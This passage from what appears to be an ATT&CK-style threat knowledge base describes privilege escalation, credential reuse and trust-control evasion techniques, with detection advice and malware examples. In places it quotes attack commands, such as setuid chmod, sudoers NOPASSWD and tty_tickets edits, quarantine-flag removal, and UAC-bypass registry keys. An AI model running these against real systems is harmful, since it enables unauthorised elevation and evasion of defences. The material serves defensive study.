+Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images. Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with Modify System Image to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to ROMMONkit and may result in the network device running a modified image.
+
+Detection:
+
+Consider comparing a copy of the network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor. Review command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration. Check boot information including system uptime, image booted, and startup configuration to determine if results are consistent with expected behavior in the environment. Monitor unusual connections or connection attempts to the device that may specifically target TFTP or other file-sharing protocols.
+
+
+### T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid
+
+Description:
+
+An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. Linux and Mac File and Directory Permissions Modification). The chmod command can set these bits with bitmasking, chmod 4777 [file] or via shorthand naming, chmod u+s [file]. This will enable the setuid bit. To enable the setgid bit, chmod 2775 and chmod g+s can be used. Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future. This abuse is often part of a "shell escape" or other actions to bypass an execution environment with restricted permissions. Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. File and Directory Discovery). The setuid and setguid bits are indicated with an "s" instead of an "x" when viewing a file's attributes via ls -l. The find command can also be used to search for such files. For example, find / -perm +4000 2>/dev/null can be used to find files with setuid set and find / -perm +2000 2>/dev/null may be used for setgid. Binaries that have these bits set may then be abused by adversaries.
+
+Detection:
+
+Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.
+
+Procedures:
+
+- [S0276] Keydnap: Keydnap adds the setuid flag to a binary so it can easily elevate in the future.
+- [S0401] Exaramel for Linux: Exaramel for Linux can execute commands with high privileges via a specific binary with setuid functionality.
+
+### T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control
+
+Description:
+
+Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as: * eventvwr.exe can auto-elevate and execute a specified binary or script. Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.
+
+Detection:
+
+There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of Process Injection and unusual loaded DLLs through DLL, which indicate attempts to gain access to higher privileged processes. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example: * The eventvwr.exe bypass uses the [HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command Registry key. * The sdclt.exe bypass uses the [HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe and [HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand Registry keys. Analysts should monitor these Registry settings for unauthorized changes.
+
+Procedures:
+
+- [S0089] BlackEnergy: BlackEnergy attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.
+- [S0148] RTM: RTM can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.
+- [S1202] LockBit 3.0: LockBit 3.0 can bypass UAC to execute code with elevated privileges through an elevated Component Object Model (COM) interface.
+- [S0154] Cobalt Strike: Cobalt Strike can use a number of known techniques to bypass Windows UAC.
+- [S0666] Gelsemium: Gelsemium can bypass UAC to elevate process privileges on a compromised host.
+- [S0230] ZeroT: Many ZeroT samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.
+- [S1018] Saint Bot: Saint Bot has attempted to bypass UAC using `fodhelper.exe` to escalate privileges.
+- [S1111] DarkGate: DarkGate uses two distinct User Account Control (UAC) bypass techniques to escalate privileges.
+- [G0082] APT38: APT38 has used the legitimate application `ieinstal.exe` to bypass UAC.
+- [S0670] WarzoneRAT: WarzoneRAT can use `sdclt.exe` to bypass UAC in Windows 10 to escalate privileges; for older Windows versions WarzoneRAT can use the IFileOperation exploit to bypass the UAC module.
+- [S0192] Pupy: Pupy can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.
+- [S0378] PoshC2: PoshC2 can utilize multiple methods to bypass UAC.
+- [S0356] KONNI: KONNI has bypassed UAC by performing token impersonation as well as an RPC-based method, this included bypassing UAC set to “AlwaysNotify".
+- [S0074] Sakula: Sakula contains UAC bypass code for both 32- and 64-bit systems.
+- [S0444] ShimRat: ShimRat has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing.
+- [S1068] BlackCat: BlackCat can bypass UAC to escalate privileges.
+- [S1199] LockBit 2.0: LockBit 2.0 can bypass UAC through creating the Registry key `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\ICM\Calibration`.
+- [G0120] Evilnum: Evilnum has used PowerShell to bypass UAC.
+- [G0067] APT37: APT37 has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges.
+- [G0060] BRONZE BUTLER: BRONZE BUTLER has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation.
+- [S0129] AutoIt backdoor: AutoIt backdoor attempts to escalate privileges by bypassing User Access Control.
+- [S0182] FinFisher: FinFisher performs UAC bypass.
+- [S0606] Bad Rabbit: Bad Rabbit has attempted to bypass UAC and gain elevated administrative privileges.
+- [S0134] Downdelph: Downdelph bypasses UAC to escalate privileges by using a custom “RedirectEXE” shim database.
+- [S0250] Koadic: Koadic has 2 methods for elevating integrity. It can bypass UAC through `eventvwr.exe` and `sdclt.exe`.
+- [S0640] Avaddon: Avaddon bypasses UAC using the CMSTPLUA COM interface.
+- [S0262] QuasarRAT: QuasarRAT can generate a UAC pop-up Window to prompt the target user to run a command as the administrator.
+- [S0141] Winnti for Windows: Winnti for Windows can use a variant of the sysprep UAC bypass.
+- [S0612] WastedLocker: WastedLocker can perform a UAC bypass if it is not executed with administrator rights or if the infected host runs Windows Vista or later.
+- [G0069] MuddyWater: MuddyWater uses various techniques to bypass UAC.
+- [S0501] PipeMon: PipeMon installer can use UAC bypass techniques to install the payload.
+- [S0447] Lokibot: Lokibot has utilized multiple techniques to bypass UAC.
+- [S0132] H1N1: H1N1 bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).
+- [G0080] Cobalt Group: Cobalt Group has bypassed UAC.
+- [S0254] PLAINTEE: An older variant of PLAINTEE performs UAC bypass.
+- [S0332] Remcos: Remcos has a command for UAC bypassing.
+- [S0458] Ramsay: Ramsay can use UACMe for privilege escalation.
+- [S0570] BitPaymer: BitPaymer can suppress UAC prompts by setting the HKCU\Software\Classes\ms-settings\shell\open\command registry key on Windows 10 or HKCU\Software\Classes\mscfile\shell\open\command on Windows 7 and launching the eventvwr.msc process, which launches BitPaymer with elevated privileges.
+- [G1006] Earth Lusca: Earth Lusca has used the Fodhelper UAC bypass technique to gain elevated privileges.
+- [C0006] Operation Honeybee: During Operation Honeybee, the threat actors used the malicious NTWDBLIB.DLL and `cliconfig.exe` to bypass UAC protections.
+- [S0527] CSPY Downloader: CSPY Downloader can bypass UAC using the SilentCleanup task to execute the binary with elevated privileges.
+- [S1039] Bumblebee: Bumblebee has the ability to bypass UAC to deploy post exploitation tools with elevated privileges.
+- [G0027] Threat Group-3390: A Threat Group-3390 tool can use a public UAC bypass method to elevate privileges.
+- [S0531] Grandoreiro: Grandoreiro can bypass UAC by registering as the default handler for .MSC files.
+- [S0660] Clambling: Clambling has the ability to bypass UAC using a `passuac.dll` file.
+- [S0140] Shamoon: Shamoon attempts to disable UAC remote restrictions by modifying the Registry.
+- [S0692] SILENTTRINITY: SILENTTRINITY contains a number of modules that can bypass UAC, including through Window's Device Manager, Manage Optional Features, and an image hijack on the `.msc` file extension.
+- [S0584] AppleJeus: AppleJeus has presented the user with a UAC prompt to elevate privileges while installing.
+- [S0260] InvisiMole: InvisiMole can use fileless UAC bypass and create an elevated COM object to escalate privileges.
+- [S0669] KOCTOPUS: KOCTOPUS will perform UAC bypass either through fodhelper.exe or eventvwr.exe.
+- [S0633] Sliver: Sliver can leverage multiple techniques to bypass User Account Control (UAC) on Windows systems.
+- [G0040] Patchwork: Patchwork bypassed User Access Control (UAC).
+- [S1149] CHIMNEYSWEEP: CHIMNEYSWEEP can make use of the Windows `SilentCleanup` scheduled task to execute its payload with elevated privileges.
+- [S1130] Raspberry Robin: Raspberry Robin will use the legitimate Windows utility fodhelper.exe to run processes at elevated privileges without requiring a User Account Control prompt.
+- [S1081] BADHATCH: BADHATCH can utilize the CMSTPLUA COM interface and the SilentCleanup task to bypass UAC.
+- [S0116] UACMe: UACMe contains many methods for bypassing Windows User Account Control on multiple versions of the operating system.
+- [S0363] Empire: Empire includes various modules to attempt to bypass UAC for escalation of privileges.
+- [S0662] RCSession: RCSession can bypass UAC to escalate privileges.
+- [G0016] APT29: APT29 has bypassed UAC.
+
+### T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+
+Description:
+
+Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges. Within Linux and MacOS systems, sudo (sometimes referred to as "superuser do") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The sudo command "allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments." Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again). The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL. Elevated privileges are required to edit this file though. Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user. In the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \'Defaults !tty_tickets\' >> /etc/sudoers. In order for this change to be reflected, the malware also issued killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.
+
+Detection:
+
+On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the LOG_INPUT and LOG_OUTPUT directives in the /etc/sudoers file.
+
+Procedures:
+
+- [S0154] Cobalt Strike: Cobalt Strike can use sudo to run a command.
+- [S0279] Proton: Proton modifies the tty_tickets line in the sudoers file.
+- [S0281] Dok: Dok adds admin ALL=(ALL) NOPASSWD: ALL to the /etc/sudoers file.
+
+### T1548.004 - Abuse Elevation Control Mechanism: Elevated Execution with Prompt
+
+Description:
+
+Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges. Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms. This technique may be combined with Masquerading to trick the user into granting escalated privileges to malicious code. This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.
+
+Detection:
+
+Consider monitoring for /usr/libexec/security_authtrampoline executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.
+
+Procedures:
+
+- [S0402] OSX/Shlayer: OSX/Shlayer can escalate privileges to root by asking the user for credentials.
+
+### T1548.005 - Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access
+
+Description:
+
+Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. Just-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted. Account impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts. In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts. Many cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource. While users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended. **Note:** this technique is distinct from Additional Cloud Roles, which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control Additional Cloud Roles that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.
+
+### T1548.006 - Abuse Elevation Control Mechanism: TCC Manipulation
+
+Description:
+
+Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA). When an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again. Adversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through Process Injection or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious AppleScript. When executing under the Finder App, the malicious AppleScript inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and Launchctl.
+
+Procedures:
+
+- [S0658] XCSSET: For several modules, XCSSET attempts to access or list the contents of user folders such as Desktop, Downloads, and Documents. If the folder does not exist or access is denied, it enters a loop where it resets the TCC database and retries access.
+
+
+### T1550.001 - Use Alternate Authentication Material: Application Access Token
+
+Description:
+
+Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials. Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application. For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a "refresh" token enabling background access is awarded. With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration. Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account. The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated. Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.
+
+Detection:
+
+Monitor access token activity for abnormal use and permissions granted to unusual or suspicious applications and APIs. Additionally, administrators should review logs for calls to the AWS Security Token Service (STS) and usage of GCP service accounts in order to identify anomalous actions.
+
+Procedures:
+
+- [S0683] Peirates: Peirates can use stolen service account tokens to perform its operations. It also enables adversaries to switch between valid service accounts.
+- [S1023] CreepyDrive: CreepyDrive can use legitimate OAuth refresh tokens to authenticate with OneDrive.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 used compromised service principals to make changes to the Office 365 environment.
+- [G0007] APT28: APT28 has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail.
+- [G0125] HAFNIUM: HAFNIUM has abused service principals with administrative permissions for data exfiltration.
+
+### T1550.002 - Use Alternate Authentication Material: Pass the Hash
+
+Description:
+
+Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. When performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. Adversaries may also use stolen password hashes to "overpass the hash." Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.
+
+Detection:
+
+Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious. Event ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.
+
+Procedures:
+
+- [G0050] APT32: APT32 has used pass the hash for lateral movement.
+- [S0154] Cobalt Strike: Cobalt Strike can perform pass the hash.
+- [S0122] Pass-The-Hash Toolkit: Pass-The-Hash Toolkit can perform pass the hash.
+- [G0007] APT28: APT28 has used pass the hash for lateral movement.
+- [G0143] Aquatic Panda: Aquatic Panda used a registry edit to enable a Windows feature called RestrictedAdmin in victim environments. This change allowed Aquatic Panda to leverage "pass the hash" mechanisms as the alteration allows for RDP connections with a valid account name and hash only, without possessing a cleartext password value.
+- [G0114] Chimera: Chimera has dumped password hashes for use in pass the hash authentication attacks.
+- [G0006] APT1: The APT1 group is known to have used pass the hash.
+- [G0102] Wizard Spider: Wizard Spider has used the `Invoke-SMBExec` PowerShell cmdlet to execute the pass-the-hash technique and utilized stolen password hashes to move laterally.
+- [S0376] HOPLIGHT: HOPLIGHT has been observed loading several APIs associated with Pass the Hash.
+- [S0378] PoshC2: PoshC2 has a number of modules that leverage pass the hash for lateral movement.
+- [S0002] Mimikatz: Mimikatz's SEKURLSA::Pth module can impersonate a user, with only a password hash, to execute arbitrary commands.
+- [G0096] APT41: APT41 uses tools such as Mimikatz to enable lateral movement via captured password hashes.
+- [G0094] Kimsuky: Kimsuky has used pass the hash for authentication to remote access software used in C2.
+- [S0363] Empire: Empire can perform pass the hash attacks.
+- [G1016] FIN13: FIN13 has used the PowerShell utility `Invoke-SMBExec` to execute the pass the hash method for lateral movement within an compromised environment.
+- [G1003] Ember Bear: Ember Bear has used pass-the-hash techniques for lateral movement in victim environments.
+- [S1081] BADHATCH: BADHATCH can perform pass the hash on compromised machines with x64 versions.
+- [S0488] CrackMapExec: CrackMapExec can pass the hash to authenticate via SMB.
+- [C0002] Night Dragon: During Night Dragon, threat actors used pass-the-hash tools to obtain authenticated access to sensitive internal desktops and servers.
+- [G0093] GALLIUM: GALLIUM used dumped hashes to authenticate to other machines via pass the hash.
+
+### T1550.003 - Use Alternate Authentication Material: Pass the Ticket
+
+Description:
+
+Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system. When preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. A Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). A Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, "overpassing the hash" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.
+
+Detection:
+
+Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. Event ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to "Integrity check on decrypted field failed" and indicates misuse by a previously invalidated golden ticket.
+
+Procedures:
+
+- [S0053] SeaDuke: Some SeaDuke samples have a module to use pass the ticket with Kerberos for authentication.
+- [G0016] APT29: APT29 used Kerberos ticket attacks for lateral movement.
+- [S0002] Mimikatz: Mimikatz’s LSADUMP::DCSync and KERBEROS::PTT modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.
+- [S0192] Pupy: Pupy can also perform pass-the-ticket.
+- [G0050] APT32: APT32 successfully gained remote access by using pass the ticket.
+- [G0060] BRONZE BUTLER: BRONZE BUTLER has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.
+
+### T1550.004 - Use Alternate Authentication Material: Web Session Cookie
+
+Description:
+
+Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated. Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through Steal Web Session Cookie or Web Cookies, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform. There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.
+
+Detection:
+
+Monitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.
+
+Procedures:
+
+- [G1033] Star Blizzard: Star Blizzard has bypassed multi-factor authentication on victim email accounts by using session cookies stolen using EvilGinx.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 used stolen cookies to access cloud resources and a forged `duo-sid` cookie to bypass MFA set on an email account.
+
+
+### T1553.001 - Subvert Trust Controls: Gatekeeper Bypass
+
+Description:
+
+Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications. Based on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions: 1. Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution. 2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers. 3. Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID. 4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an “unauthorized app” and the security policy will be modified. Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. Exploitation for Defense Evasion), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks. Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using Drive-by Compromise.
+
+Detection:
+
+The removal of the com.apple.quarantine flag by a user instead of the operating system is a suspicious action and should be examined further. Monitor and investigate attempts to modify extended file attributes with utilities such as xattr. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Monitor software update frameworks that strip the com.apple.quarantine flag when performing updates. Review false values under the LSFileQuarantineEnabled entry in an application's Info.plist file (required by every application). false under LSFileQuarantineEnabled indicates that an application does not use the quarantine flag. Unsandboxed applications with an unspecified LSFileQuarantineEnabled entry will default to not setting the quarantine flag. QuarantineEvents is a SQLite database containing a list of all files assigned the com.apple.quarantine attribute, located at ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2. Each event contains the corresponding UUID, timestamp, application, Gatekeeper score, and decision if it was allowed.
+
+Procedures:
+
+- [S0658] XCSSET: XCSSET has dropped a malicious applet into an app's `.../Contents/MacOS/` folder of a previously launched app to bypass Gatekeeper's security checks on first launch apps (prior to macOS 13).
+- [S0402] OSX/Shlayer: If running with elevated privileges, OSX/Shlayer has used the spctl command to disable Gatekeeper protection for a downloaded file. OSX/Shlayer can also leverage system links pointing to bash scripts in the downloaded DMG file to bypass Gatekeeper, a flaw patched in macOS 11.3 and later versions. OSX/Shlayer has been Notarized by Apple, resulting in successful passing of additional Gatekeeper checks.
+- [S1153] Cuckoo Stealer: Cuckoo Stealer can use `xattr -d com.apple.quarantine` to remove the quarantine flag attribute.
+- [S1016] MacMa: MacMa has removed the `com.apple.quarantineattribute` from the dropped file, `$TMPDIR/airportpaird`.
+- [S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D uses the command xattr -d com.apple.quarantine to remove the quarantine file attribute used by Gatekeeper.
+- [S0369] CoinTicker: CoinTicker downloads the EggShell mach-o binary using curl, which does not set the quarantine flag.
+
+### T1553.002 - Subvert Trust Controls: Code Signing
+
+Description:
+
+Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. The certificates used during an operation may be created, acquired, or stolen by the adversary. Unlike Invalid Code Signature, this activity will result in a valid signature. Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. Code signing certificates may be used to bypass security policies that require signed code to execute on a system.
+
+Detection:
+
+Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.
+
+Procedures:
+
+- [S0154] Cobalt Strike: Cobalt Strike can use self signed Java applets to execute signed applet attacks.
+- [S0475] BackConfig: BackConfig has been signed with self signed digital certificates mimicking a legitimate software company.
